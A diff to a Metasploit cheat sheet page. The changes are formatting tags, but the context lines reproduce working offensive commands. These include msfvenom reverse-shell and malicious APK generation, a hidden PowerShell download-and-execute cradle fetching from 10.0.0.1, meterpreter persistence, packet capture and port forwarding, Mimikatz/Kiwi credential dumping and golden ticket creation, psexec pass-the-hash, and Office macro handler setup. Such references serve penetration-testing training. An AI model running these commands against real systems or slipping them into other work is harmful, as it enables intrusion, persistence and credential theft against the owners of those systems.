@@ -13,11 +13,11 @@ intro: |
     Metasploit CheatSheet
 ---
 
-## Installation
+## Installation {.cols-2}
 
 ### shell
 
-```shell script
+```shell script {.wrap}
 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall 
 $ chmod 755 msfinstall 
 $ ./msfinstall
@@ -25,11 +25,11 @@ $ ./msfinstall
 
 ### docker
 
-```shell script
+```shell script {.wrap}
 $ sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
 ```
 
-## Sessions
+## Sessions {.cols-1}
 
 ### Sessions command
 
@@ -44,7 +44,7 @@ $ sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/da
 | sessions -i 10-20 -c "id"                                                                | Execute a command on several sessions |
 {.shortcuts}
 
-## Background
+## Background {.cols-1}
 
 ### Background handler
 
@@ -63,7 +63,7 @@ msf> generate -o /tmp/meterpreter.exe -f exe
 msf> to_handler
 ```
 
-## Basic msfvenom
+## Basic msfvenom {.cols-1}
 
 ### Generate a meterpreter
 
@@ -81,13 +81,13 @@ $ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > she
 $ msfvenom --platform android -p android/meterpreter/reverse_tcp lhost="10.10.10.110" lport=4242 R -o malicious.apk
 ```
 
-## Basic handler
+## Basic handler {.cols-2}
 
 ### Meterpreter Webdelivery
 
 Set up a Powershell web delivery listening on port 8080.
 
-```shell script
+```shell script {.wrap}
 msf> use exploit/multi/script/web_delivery
 msf> set TARGET 2
 msf> set payload windows/x64/meterpreter/reverse_http
@@ -98,7 +98,7 @@ msf> run
 
 Powershell Run
 
-```shell script
+```shell script {.wrap}
 powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/0x010101');
 ```
 
@@ -107,7 +107,7 @@ powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRe
 
 Get System testing
 
-```powershell
+```powershell {.wrap}
 meterpreter > getsystem
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
 
@@ -123,7 +123,7 @@ meterpreter> run persistence -U -p 4242
 
 OPTIONS:
 
-```shell script
+```shell script {.wrap}
 -A        Automatically start a matching exploit/multi/handler to connect to the agent
 -L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
 -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
@@ -142,7 +142,7 @@ OPTIONS:
 
 interfaces Mode
 
-```shell script
+```shell script {.wrap}
 # list interfaces
 meterpreter> run packetrecorder -li
 
@@ -154,7 +154,7 @@ meterpreter> run packetrecorder -i 1
 
 portfwd Mode
 
-```shell script
+```shell script {.wrap}
 meterpreter> portfwd add -l 7777 -r 172.17.0.2 -p 3006
 ```
 
@@ -162,7 +162,7 @@ meterpreter> portfwd add -l 7777 -r 172.17.0.2 -p 3006
 
 file transfer
 
-```shell script
+```shell script {.wrap}
 upload /path/in/hdd/payload.exe exploit.exe
 download /path/in/victim
 ```
@@ -171,7 +171,7 @@ download /path/in/victim
 
 Overwrite the memory space in this process with the program we want to execute.
 
-```shell script
+```shell script {.wrap}
 meterpreter> execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
 ```
 
@@ -181,7 +181,7 @@ Metasploit offers Mimikatz and Kiwi extensions to perform various types of crede
 
 Mimikatz
 
-```shell script
+```shell script {.wrap}
 meterpreter> load mimikatz
 meterpreter> mimikatz_command -f version
 meterpreter> mimikatz_command -f samdump::hashes
@@ -192,7 +192,7 @@ meterpreter> mimikatz_command -f sekurlsa::logonPasswords full
 
 Kiwi
 
-```shell script
+```shell script {.wrap}
 meterpreter> load kiwi
 meterpreter> creds_all
 meterpreter> golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
@@ -202,7 +202,7 @@ meterpreter> golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID w
 
 Pass the Hash
 
-```shell script
+```shell script {.wrap}
 msf > use exploit/windows/smb/psexec
 msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
 msf exploit(psexec) > exploit
@@ -219,13 +219,13 @@ Set proxy
 setg Proxies socks4:127.0.0.1:1080
 ```
 
-## Scripting Metasploit
+## Scripting Metasploit {.cols-1}
 
 ### Office macro
 
 Using a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`.  Here is a simple example to script the deployment of a handler an create an Office doc with macro.
 
-```shell script
+```shell script {.wrap}
 msf> use exploit/multi/handler
 msf> set PAYLOAD windows/meterpreter/reverse_https
 msf> set LHOST 0.0.0.0
